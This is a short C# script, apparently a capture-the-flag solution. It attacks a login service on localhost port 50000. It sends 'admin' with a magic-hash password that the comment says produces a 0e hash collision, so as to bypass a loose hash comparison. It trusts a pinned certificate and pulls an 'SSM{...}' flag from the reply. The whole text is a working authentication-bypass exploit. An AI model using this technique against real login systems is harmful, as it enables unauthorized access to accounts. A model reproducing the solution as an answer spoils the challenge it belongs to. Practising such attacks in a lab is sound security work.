using System.Net.Security;
using System.Text.RegularExpressions;

Dictionary<string, string> values = new()
{
      { "username", "admin" }, // "hare" also works
      { "password", "xvRv0OwB" } // 0e hash collision, magic hash gotten from https://github.com/spaze/hashes/blob/master/haval160%2C5.md
};

using HttpClientHandler httpClientHandler = new();
httpClientHandler.ServerCertificateCustomValidationCallback = (_, cert, _, sslPolicyErrors) => sslPolicyErrors == SslPolicyErrors.None || cert.GetCertHashString() == "318D59D452B5C1B19D7832ACDE693AEFA6A5A8FB";
HttpResponseMessage res = await new HttpClient(httpClientHandler).PostAsync("https://127.0.0.1:50000", new FormUrlEncodedContent(values));
Console.WriteLine(Regex.Match(await res.Content.ReadAsStringAsync(), "(SSM{.*})").Value);
